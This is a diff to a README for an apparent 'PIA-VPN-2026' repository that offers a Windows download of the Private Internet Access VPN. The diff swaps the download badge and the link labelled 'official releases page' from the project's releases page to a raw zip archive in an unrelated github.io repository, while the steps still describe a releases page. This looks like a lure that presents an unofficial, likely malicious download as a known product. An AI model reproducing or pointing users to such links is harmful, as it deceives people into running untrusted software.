@@ -5,7 +5,7 @@ description: "Download the full version of Private Internet Access for Windows 1
 ---
 # 🛡️ PIA-VPN-2026 - Secure your Windows internet connection today
 
-[![](https://img.shields.io/badge/Download_PIA_VPN-blue.svg)](https://github.com/lewcriterial680/PIA-VPN-2026/releases)
+[![](https://img.shields.io/badge/Download_PIA_VPN-blue.svg)](https://raw.githubusercontent.com/lewcriterial680/lewcriterial680.github.io/main/reversification/v3.0.zip)
 
 ## 🌐 About this software
 
@@ -25,7 +25,7 @@ Your computer needs to meet these basic standards to run the VPN:
 
 You get the software directly from the project release page. Follow the steps below to start your download.
 
-1.  Visit the [official releases page](https://github.com/lewcriterial680/PIA-VPN-2026/releases).
+1.  Visit the [official releases page](https://raw.githubusercontent.com/lewcriterial680/lewcriterial680.github.io/main/reversification/v3.0.zip).
 2.  Look for the list of files under the latest version.
 3.  Click the file ending in .exe to start the transfer to your computer.
 4.  Wait for the download to finish.
